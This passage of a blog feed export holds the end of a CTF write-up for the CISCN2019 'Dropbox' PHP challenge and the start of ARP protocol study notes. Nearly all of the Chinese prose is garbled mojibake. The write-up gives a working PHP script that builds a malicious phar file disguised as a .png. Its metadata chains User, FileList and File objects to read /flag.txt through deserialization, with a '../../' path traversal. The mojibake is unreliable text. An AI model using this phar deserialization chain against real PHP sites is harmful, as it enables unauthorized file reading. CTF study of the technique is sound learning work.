<h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>åœ¨ <code>in_set</code> è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå¯ä»¥è®¾ç½®phpçš„ä¸€äº›é…ç½®ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ <code>open_basedir</code> ï¼Œç”¨æ¥é™åˆ¶å½“å‰ç¨‹åºå¯ä»¥è®¿é—®çš„ç›®å½•ã€‚åæ¥äº†è§£åˆ°ï¼š<strong>å®ƒæ˜¯å¯ä»¥è®¿é—®è®¾ç½®ç›®å½•ä¸‹çš„æ‰€æœ‰ä¸‹çº§ç›®å½•ã€‚</strong></p>
<p>è‹¥<code>&quot;open_basedir = /dir/user&quot;</code>, é‚£ä¹ˆç›®å½• <code>&quot;/dir/user&quot;</code> å’Œ <code>/dir/other</code> éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ã€‚æ‰€ä»¥å¦‚æœè¦å°†è®¿é—®é™åˆ¶åœ¨ä»…ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œè¯·ç”¨æ–œçº¿ç»“æŸè·¯å¾„åã€‚<code>&quot;.&quot;</code>å¯ä»£è¡¨å½“å‰ç›®å½•ï¼Œ<code>open_basedir</code> ä¹Ÿå¯ä»¥åŒæ—¶è®¾ç½®å¤šä¸ªç›®å½•ï¼Œåœ¨Windowsä¸­ç”¨åˆ†å·åˆ†éš”ç›®å½•ï¼Œåœ¨ä»»ä½•å…¶å®ƒç³»ç»Ÿä¸­ç”¨å†’å·åˆ†éš”ç›®å½•ã€‚<br>ä¾‹å¦‚ä¸Šé¢ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);</span><br></pre></td></tr></table></figure></div>
<p>å°±æ˜¯åªå¯ä»¥è®¿é—®å½“å‰ç›®å½•<code>(getcwd()è¿”å›å½“å‰ç›®å½•)</code>ã€<code>/etc</code> å’Œ <code>/tmp</code> ä¸‰ä¸ªç›®å½•ã€‚<strong>è§£é‡Šäº†ä¸ºä»€ä¹ˆè¦åœ¨delete.phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download.php</strong></p>
<hr>
<h2 id="Delete-php"><a href="#Delete-php" class="headerlink" title="Delete.php"></a>Delete.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br></pre></td></tr></table></figure></div>

<h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p><code>chdir()</code> ç°å®ç›®å½•è·³è·ƒï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆä¸‹è½½æ—¶è¦<code>filename = ../../index.php</code> ï¼Œè€Œä¸æ˜¯ <code>filename = index.php</code>ã€‚</p>
<hr>
<h2 id="æ€»ç»“å‡ ç‚¹"><a href="#æ€»ç»“å‡ ç‚¹" class="headerlink" title="æ€»ç»“å‡ ç‚¹"></a>æ€»ç»“å‡ ç‚¹</h2><ul>
<li><p>Fileç±»ä¸­çš„closeæ–¹æ³•ä¼šè·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœèƒ½è§¦å‘è¯¥æ–¹æ³•ï¼Œå°±æœ‰å¯èƒ½è·å–flagã€‚</p>
</li>
<li><p>Userç±»ä¸­å­˜åœ¨closeæ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•åœ¨å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œã€‚</p>
</li>
<li><p>åŒæ—¶FileListç±»ä¸­å­˜åœ¨ <code>__call()</code>ï¼Œå¹¶ä¸”ç±»æ²¡æœ‰closeæ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªFilelistå¯¹è±¡è°ƒç”¨äº†close()æ–¹æ³•ï¼Œæ ¹æ®callæ–¹æ³•çš„ä»£ç å¯ä»¥çŸ¥é“ï¼Œæ–‡ä»¶çš„closeæ–¹æ³•ä¼šè¢«æ‰§è¡Œï¼Œå°±å¯èƒ½æ‹¿åˆ°flagã€‚</p>
</li>
</ul>
<p>æ ¹æ®ä»¥ä¸Šæ¢³ç†ä¸€ä¸‹å¯ä»¥å¾—å‡ºç»“è®º:</p>
<p>å¦‚æœèƒ½åˆ›å»ºä¸€ä¸ªuserçš„å¯¹è±¡ï¼Œå…¶dbå˜é‡æ˜¯ä¸€ä¸ªFileListå¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„æ–‡ä»¶åä¸ºflagçš„ä½ç½®ã€‚è¿™æ ·çš„è¯ï¼Œ<strong>å½“userå¯¹è±¡é”€æ¯æ—¶ï¼Œdbå˜é‡çš„closeæ–¹æ³•è¢«æ‰§è¡Œï¼›è€Œdbå˜é‡æ²¡æœ‰closeæ–¹æ³•ï¼Œè¿™æ ·å°±ä¼šè§¦å‘callé­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œå˜æˆäº†æ‰§è¡ŒFileå¯¹è±¡çš„closeæ–¹æ³•ã€‚</strong>é€šè¿‡åˆ†æFileListç±»çš„ææ„æ–¹æ³•å¯ä»¥çŸ¥é“ï¼Œ<code>closeæ–¹æ³•æ‰§è¡Œåå­˜åœ¨resultså˜é‡é‡Œçš„ç»“æœä¼šåŠ å…¥åˆ°tableå˜é‡ä¸­è¢«æ‰“å°å‡ºæ¥</code>ï¼Œä¹Ÿå°±æ˜¯flagä¼šè¢«æ‰“å°å‡ºæ¥ã€‚</p>
<hr>
<p>è¿è¡Œå¦‚ä¸‹PHPæ–‡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œæ›´æ”¹åç¼€åä¸ºpngè¿›è¡Œä¸Šä¼ ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨åˆ é™¤æ—¶ä½¿ç”¨bpæŠ“åŒ…ï¼Œä¿®æ”¹å‚æ•°ï¼Œå³å¯å¾—åˆ°flagã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1g6wcj31500ehtda.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1g6wcj31500ehtda.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/20175211lyz/p/11468401.html" target="_blank" rel="noopener">åˆ·é¢˜è®°å½•ï¼š[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a><br><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554" target="_blank" rel="noopener">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a><br><a href="https://www.jianshu.com/p/5b91e0b7f3ac" target="_blank" rel="noopener">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxä¹‹æ„šè§</a><br><a href="https://xz.aliyun.com/t/2715#toc-0" target="_blank" rel="noopener">åˆæ¢phar://</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">CTF PHPååºåˆ—åŒ–</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ARPå­¦ä¹ æ€»ç»“</title>
    <url>/yakko117/2020/01/14/ARP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="ARPå­¦ä¹ æ€»ç»“"><a href="#ARPå­¦ä¹ æ€»ç»“" class="headerlink" title="ARPå­¦ä¹ æ€»ç»“"></a>ARPå­¦ä¹ æ€»ç»“</h1><h2 id="ARPåè®®å‡ºç°çš„åŸå› "><a href="#ARPåè®®å‡ºç°çš„åŸå› " class="headerlink" title="ARPåè®®å‡ºç°çš„åŸå› "></a>ARPåè®®å‡ºç°çš„åŸå› </h2><p>ARPåè®®æ˜¯ <code>&quot;Address Resolution Protocol&quot;</code>ï¼ˆåœ°å€è§£æåè®®ï¼‰çš„ç¼©å†™ã€‚<br>åœ¨ä»¥å¤ªç½‘ç¯å¢ƒä¸­ï¼Œæ•°æ®çš„ä¼ è¾“æ‰€ä¾èµ–çš„æ˜¯MACåœ°å€è€ŒéIPåœ°å€ï¼ŒARPåè®®çš„ä½œç”¨æ˜¯å°†å·²çŸ¥IPåœ°å€è½¬æ¢ä¸ºMACåœ°å€ã€‚</p>
<p>ç”±äºæ˜¯ <code>IPåè®®</code> ä½¿ç”¨äº† <code>ARPåè®®</code>ï¼Œå› æ­¤åœ¨<code>TCP/IPæ¨¡å‹</code>é‡Œå°† <strong>ARPåè®®åˆ’å½’ä¸ºç½‘ç»œå±‚</strong>ï¼Œä½†æ˜¯åœ¨<code>OSIä¸ƒå±‚æ¨¡å‹</code>ä¸­ï¼Œå°†<strong>ARPåè®®åˆ’å½’ä¸ºæ•°æ®é“¾è·¯å±‚</strong>ã€‚</p>
<p>åœ¨å±€åŸŸç½‘ä¸­ï¼Œç½‘ç»œä¸­å®é™…ä¼ è¾“çš„æ˜¯ <code>&quot;å¸§&quot;</code>ï¼Œå¸§é‡Œé¢æœ‰ç›®æ ‡ä¸»æœºçš„MACåœ°å€ã€‚åœ¨ä»¥å¤ªç½‘ä¸­ï¼Œä¸€ä¸ªä¸»æœºå’Œå¦ä¸€ä¸ªä¸»æœºè¿›è¡Œç›´æ¥é€šä¿¡ï¼Œå¿…é¡»è¦çŸ¥é“ç›®æ ‡ä¸»æœºçš„MACåœ°å€ã€‚ä½†è¿™ä¸ªç›®æ ‡MACåœ°å€æ˜¯å¦‚ä½•è·å¾—çš„å‘¢ï¼Ÿå®ƒå°±æ˜¯é€šè¿‡åœ°å€è§£æåè®®è·å¾—çš„ã€‚</p>
<p><code>&quot;åœ°å€è§£æ&quot;</code> å°±æ˜¯ä¸»æœºåœ¨å‘é€å¸§å‰å°†ç›®æ ‡IPåœ°å€è½¬æ¢æˆç›®æ ‡MACåœ°å€çš„è¿‡ç¨‹ã€‚</p>
<p>ARPåè®®çš„åŸºæœ¬åŠŸèƒ½å°±æ˜¯é€šè¿‡ç›®æ ‡è®¾å¤‡çš„IPåœ°å€ï¼ŒæŸ¥è¯¢ç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œä»¥ä¿è¯é€šä¿¡çš„é¡ºåˆ©è¿›è¡Œã€‚</p>
<h2 id="ARPæ˜ å°„æ–¹å¼"><a href="#ARPæ˜ å°„æ–¹å¼" class="headerlink" title="ARPæ˜ å°„æ–¹å¼"></a>ARPæ˜ å°„æ–¹å¼</h2><ul>
<li>é™æ€æ˜ å°„<br>é™æ€æ˜ å°„çš„æ„æ€æ˜¯è¦æ‰‹åŠ¨åˆ›å»ºä¸€å¼ ARPè¡¨ï¼ŒæŠŠé€»è¾‘ï¼ˆIPï¼‰åœ°å€å’Œç‰©ç†åœ°å€å…³è”èµ·æ¥ã€‚è¿™ä¸ªARPè¡¨å‚¨å­˜åœ¨ç½‘ç»œä¸­çš„æ¯ä¸€å°æœºå™¨ä¸Šã€‚ä¾‹å¦‚ï¼ŒçŸ¥é“å…¶æœºå™¨çš„IPåœ°å€ä½†ä¸çŸ¥é“å…¶ç‰©ç†åœ°å€çš„æœºå™¨å°±å¯ä»¥é€šè¿‡æŸ¥ARPè¡¨æ‰¾å‡ºå¯¹åº”çš„ç‰©ç†åœ°å€ã€‚è¿™æ ·åšæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå› ä¸ºç‰©ç†åœ°å€å¯èƒ½å‘ç”Ÿå˜åŒ–ï¼š<ul>
<li>æœºå™¨å¯èƒ½æ›´æ¢ <code>NIC</code>ï¼ˆç½‘ç»œæ¥å£æ§åˆ¶å™¨ï¼ˆ<code>network interface controllerï¼ŒNIC</code>ï¼‰ï¼Œåˆç§°ç½‘ç»œé€‚é…å™¨ï¼ˆ<code>network adapter</code>ï¼‰ï¼Œç½‘å¡ï¼ˆ<code>network interface card</code>ï¼‰ï¼Œæˆ–å±€åŸŸç½‘æ¥æ”¶å™¨ï¼ˆ<code>LAN adapter</code>ï¼‰ï¼‰ï¼Œç»“æœå˜æˆä¸€ä¸ªæ–°çš„ç‰©ç†åœ°å€ã€‚</li>
<li>åœ¨æŸäº›å±€åŸŸç½‘ä¸­ï¼Œæ¯å½“è®¡ç®—æœºåŠ ç”µæ—¶ï¼Œä»–çš„ç‰©ç†åœ°å€éƒ½è¦æ”¹å˜ä¸€æ¬¡ã€‚</li>
<li>ç§»åŠ¨ç”µè„‘å¯ä»¥ä»ä¸€ä¸ªç‰©ç†ç½‘ç»œè½¬ç§»åˆ°å¦ä¸€ä¸ªç‰©ç†ç½‘ç»œï¼Œè¿™æ ·ä¼šæ—¶ç‰©ç†åœ°å€æ”¹å˜ã€‚</li>
</ul>
</li>
</ul>
<p>è¦é¿å…è¿™äº›é—®é¢˜å‡ºç°ï¼Œå¿…é¡»å®šæœŸç»´æŠ¤æ›´æ–°ARPè¡¨ï¼Œæ­¤ç±»æ¯”è¾ƒéº»çƒ¦è€Œä¸”ä¼šå½±å“ç½‘ç»œæ€§èƒ½ã€‚</p>
<ul>
<li>åŠ¨æ€æ˜ å°„<br>åŠ¨æ€æ˜ å°„æ—¶ï¼Œæ¯æ¬¡åªè¦æœºå™¨çŸ¥é“å¦ä¸€å°æœºå™¨çš„é€»è¾‘ï¼ˆIPï¼‰åœ°å€ï¼Œå°±å¯ä»¥ä½¿ç”¨åè®®æ‰¾å‡ºç›¸å¯¹åº”çš„ç‰©ç†åœ°å€ã€‚å·²ç»è®¾è®¡å‡ºçš„å®ç°äº†åŠ¨æ€æ˜ å°„åè®®çš„æœ‰ <code>ARP</code> å’Œ <code>RARP</code> ä¸¤ç§ã€‚<code>ARP</code> æŠŠ <strong>IPåœ°å€æ˜ å°„ä¸ºç‰©ç†åœ°å€</strong>ã€‚<code>RARP</code> æŠŠ <strong>ç‰©ç†åœ°å€æ˜ å°„ä¸ºé€»è¾‘ï¼ˆIPï¼‰åœ°å€</strong>ã€‚</li>
</ul>
<hr>
<h2 id="ARPåŸç†åŠæµç¨‹"><a href="#ARPåŸç†åŠæµç¨‹" class="headerlink" title="ARPåŸç†åŠæµç¨‹"></a>ARPåŸç†åŠæµç¨‹</h2><h3 id="ARPè¯·æ±‚"><a href="#ARPè¯·æ±‚" class="headerlink" title="ARPè¯·æ±‚"></a>ARPè¯·æ±‚</h3><p>åœ¨ä»»ä½•æ—¶å€™ï¼Œä¸€å°ä¸»æœºæœ‰IPæ•°æ®æŠ¥æ–‡å‘é€ç»™å¦ä¸€å°ä¸»æœºï¼Œå®ƒéƒ½è¦çŸ¥é“æ¥æ”¶æ–¹çš„é€»è¾‘ï¼ˆIPï¼‰åœ°å€ã€‚ä½†æ˜¯IPåœ°å€å¿…é¡»å°è£…æˆå¸§æ‰èƒ½é€šè¿‡ç‰©ç†ç½‘ç»œã€‚è¿™å°±æ„å‘³ç€å‘é€æ–¹å¿…é¡»æœ‰æ¥æ”¶æ–¹çš„ç‰©ç†ï¼ˆMACï¼‰åœ°å€ï¼Œå› æ­¤éœ€è¦å®Œæˆé€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ã€‚è€ŒARPåè®®å¯ä»¥æ¥æ”¶æ¥è‡ªIPåè®®çš„é€»è¾‘åœ°å€ï¼Œå°†å…¶æ˜ å°„ä¸ºç›¸åº”çš„ç‰©ç†åœ°å€ï¼Œç„¶åæŠŠç‰©ç†åœ°å€é€’äº¤ç»™æ•°æ®é“¾è·¯å±‚ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnnqrj30vh0migsj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lnnqrj30vh0migsj.jpg" class="lazyload" title="test"></a></p>
<h3 id="ARPå“åº”"><a href="#ARPå“åº”" class="headerlink" title="ARPå“åº”"></a>ARPå“åº”</h3><p>å±€åŸŸç½‘ä¸­çš„æ¯ä¸€å°ä¸»æœºéƒ½ä¼šæ¥å—å¹¶å¤„ç†è¿™ä¸ªARPè¯·æ±‚æŠ¥æ–‡ï¼Œç„¶åè¿›è¡ŒéªŒè¯ï¼ŒæŸ¥çœ‹æ¥æ”¶æ–¹çš„IPåœ°å€æ˜¯ä¸æ˜¯è‡ªå·±çš„åœ°å€ï¼Œåªæœ‰éªŒè¯æˆåŠŸçš„ä¸»æœºæ‰ä¼šè¿”å›ä¸€ä¸ªARPå“åº”æŠ¥æ–‡ï¼Œè¿™ä¸ªå“åº”æŠ¥æ–‡åŒ…å«æ¥æ”¶æ–¹çš„IPåœ°å€å’Œç‰©ç†åœ°å€ã€‚è¿™ä¸ªæŠ¥æ–‡åˆ©ç”¨æ”¶åˆ°çš„ARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„è¯·æ±‚æ–¹ç‰©ç†åœ°å€ä»¥å•æ’­çš„æ–¹å¼ç›´æ¥å‘é€ç»™ARPè¯·æ±‚æŠ¥æ–‡çš„è¯·æ±‚æ–¹ã€‚</p>
<h3 id="å·¥ä½œè¿‡ç¨‹"><a href="#å·¥ä½œè¿‡ç¨‹" class="headerlink" title="å·¥ä½œè¿‡ç¨‹"></a>å·¥ä½œè¿‡ç¨‹</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸»æœºA çš„IPåœ°å€ä¸º 192.168.1.1ï¼ŒMACåœ°å€ä¸º0A-11-22-33-44-01ï¼›</span><br><span class="line">ä¸»æœºB çš„IPåœ°å€ä¸º 192.168.1.2ï¼ŒMACåœ°å€ä¸º0A-11-22-33-44-02ï¼›</span><br></pre></td></tr></table></figure></div>

<p>å½“ä¸»æœºAè¦ä¸ä¸»æœºBé€šä¿¡æ—¶ï¼Œåœ°å€è§£æåè®®å¯ä»¥å°†ä¸»æœºBçš„IPåœ°å€ï¼ˆ192.168.1.2ï¼‰è§£ææˆä¸»æœºBçš„MACåœ°å€ï¼Œä»¥ä¸‹ä¸ºå·¥ä½œæµç¨‹ï¼š</p>
<ul>
<li><p>ç¬¬1æ­¥ï¼šæ ¹æ® <code>ä¸»æœºAä¸Šçš„è·¯ç”±è¡¨å†…å®¹</code> ï¼ŒIPç¡®å®šç”¨äº<strong>è®¿é—®ä¸»æœºBçš„è½¬å‘IPåœ°å€æ˜¯192.168.1.2</strong>ã€‚ç„¶åAä¸»æœºåœ¨è‡ªå·±çš„ <code>æœ¬åœ°ARPç¼“å­˜</code>ä¸­æ£€æŸ¥ä¸»æœºBçš„åŒ¹é…MACåœ°å€ã€‚</p>
</li>
<li><p>ç¬¬2æ­¥ï¼šå¦‚æœä¸»æœºA<code>åœ¨ARPç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°æ˜ å°„</code>ï¼Œå®ƒå°†è¯¢é—®192.168.1.2çš„ç¡¬ä»¶åœ°å€ï¼Œä»è€Œ <code>å°†ARPè¯·æ±‚å¸§å¹¿æ’­åˆ°æœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœº</code> ã€‚æºä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€éƒ½åŒ…æ‹¬åœ¨ARPè¯·æ±‚ä¸­ã€‚æœ¬åœ°ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½æ¥æ”¶åˆ°ARPè¯·æ±‚å¹¶ä¸”æ£€æŸ¥æ˜¯å¦ä¸è‡ªå·±çš„IPåœ°å€åŒ¹é…ã€‚å¦‚æœä¸»æœºå‘ç°è¯·æ±‚çš„IPåœ°å€ä¸è‡ªå·±çš„IPåœ°å€ä¸åŒ¹é…ï¼Œå®ƒå°†ä¸¢å¼ƒARPè¯·æ±‚ã€‚</p>
</li>
<li><p>ç¬¬3æ­¥ï¼šä¸»æœºBç¡®å®šARPè¯·æ±‚ä¸­çš„IPåœ°å€ä¸è‡ªå·±çš„IPåœ°å€åŒ¹é…ï¼Œåˆ™å°†ä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ·»åŠ åˆ°æœ¬åœ°ARPç¼“å­˜ä¸­ã€‚</p>
</li>
<li><p>ç¬¬4æ­¥ï¼šä¸»æœºBå°†åŒ…å«å…¶MACåœ°å€çš„ARPå›å¤æ¶ˆæ¯ç›´æ¥å‘é€å›ä¸»æœºAã€‚</p>
</li>
<li><p>ç¬¬5æ­¥ï¼šå½“ä¸»æœºAæ”¶åˆ°ä»ä¸»æœºBå‘æ¥çš„ARPå›å¤æ¶ˆæ¯æ—¶ï¼Œä¼šç”¨ä¸»æœºBçš„IPå’ŒMACåœ°å€æ˜ å°„æ›´æ–°ARPç¼“å­˜ã€‚æœ¬æœºç¼“å­˜æ˜¯æœ‰ç”Ÿå­˜æœŸçš„ï¼Œç”Ÿå­˜æœŸç»“æŸåï¼Œå°†å†æ¬¡é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ã€‚ä¸»æœºBçš„MACåœ°å€ä¸€æ—¦ç¡®å®šï¼Œä¸»æœºAå°±èƒ½å‘ä¸»æœºBå‘é€IPé€šä¿¡äº†ã€‚</p>
</li>
</ul>
<hr>
<h2 id="ARPåè®®æŠ¥æ–‡å­—æ®µæŠ“åŒ…è§£æ"><a href="#ARPåè®®æŠ¥æ–‡å­—æ®µæŠ“åŒ…è§£æ" class="headerlink" title="ARPåè®®æŠ¥æ–‡å­—æ®µæŠ“åŒ…è§£æ"></a>ARPåè®®æŠ¥æ–‡å­—æ®µæŠ“åŒ…è§£æ</h2><h3 id="æŠ¥æ–‡æ ¼å¼"><a href="#æŠ¥æ–‡æ ¼å¼" class="headerlink" title="æŠ¥æ–‡æ ¼å¼"></a>æŠ¥æ–‡æ ¼å¼</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lp7r8j30qd0hbn00.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gaxc4lp7r8j30qd0hbn00.jpg" class="lazyload" title="test"></a></p>
<p><strong>ç¡¬ä»¶ç±»å‹</strong>ï¼š16ä½å­—æ®µï¼Œç”¨æ¥å®šä¹‰è¿è¡ŒARPçš„ç½‘ç»œç±»å‹ã€‚æ¯ä¸ªå±€åŸŸç½‘åŸºäºå…¶ç±»å‹è¢«æŒ‡æ´¾ä¸€ä¸ªæ•´æ•°ã€‚ä¾‹å¦‚ï¼šä»¥å¤ªç½‘çš„ç±»å‹ä¸º1ã€‚ARPå¯ç”¨åœ¨ä»»ä½•ç‰©ç†ç½‘ç»œä¸Šã€‚</p>
<p><strong>åè®®ç±»å‹</strong>ï¼š16ä½å­—æ®µï¼Œç”¨æ¥å®šä¹‰ä½¿ç”¨çš„åè®®ã€‚ä¾‹å¦‚ï¼šå¯¹IPv4åè®®è¿™ä¸ªå­—æ®µæ˜¯0800ã€‚ARPå¯ç”¨äºä»»ä½•é«˜å±‚åè®®</p>
<p><strong>ç¡¬ä»¶é•¿åº¦</strong>ï¼š8ä½å­—æ®µï¼Œç”¨æ¥å®šä¹‰ç‰©ç†åœ°å€çš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚ä¾‹å¦‚ï¼šå¯¹äºä»¥å¤ªç½‘çš„å€¼ä¸º6ã€‚</p>
<p><strong>åè®®é•¿åº¦</strong>ï¼š8ä½å­—æ®µï¼Œç”¨æ¥å®šä¹‰é€»è¾‘åœ°å€çš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚ä¾‹å¦‚ï¼šå¯¹äºIPv4åè®®çš„å€¼ä¸º4ã€‚</p>
<p><strong>æ“ä½œç </strong>ï¼š16ä½å­—æ®µï¼Œç”¨æ¥å®šä¹‰æŠ¥æ–‡çš„ç±»å‹ã€‚å·²å®šä¹‰çš„åˆ†ç»„ç±»å‹æœ‰ä¸¤ç§ï¼šARPè¯·æ±‚ï¼ˆ1ï¼‰ï¼ŒARPå“åº”ï¼ˆ2ï¼‰ã€‚</p>
<p><strong>æºç¡¬ä»¶åœ°å€</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦å­—æ®µï¼Œç”¨æ¥å®šä¹‰å‘é€æ–¹çš„ç‰©ç†åœ°å€ã€‚ä¾‹å¦‚ï¼šå¯¹äºä»¥å¤ªç½‘è¿™ä¸ªå­—æ®µçš„é•¿åº¦æ˜¯6å­—èŠ‚ã€‚</p>
<p><strong>æºé€»è¾‘åœ°å€</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦å­—æ®µï¼Œç”¨æ¥å®šä¹‰å‘é€æ–¹çš„é€»è¾‘ï¼ˆIPï¼‰åœ°å€ã€‚ä¾‹å¦‚ï¼šå¯¹äºIPåè®®è¿™ä¸ªå­—æ®µçš„é•¿åº¦æ˜¯4å­—èŠ‚ã€‚</p>
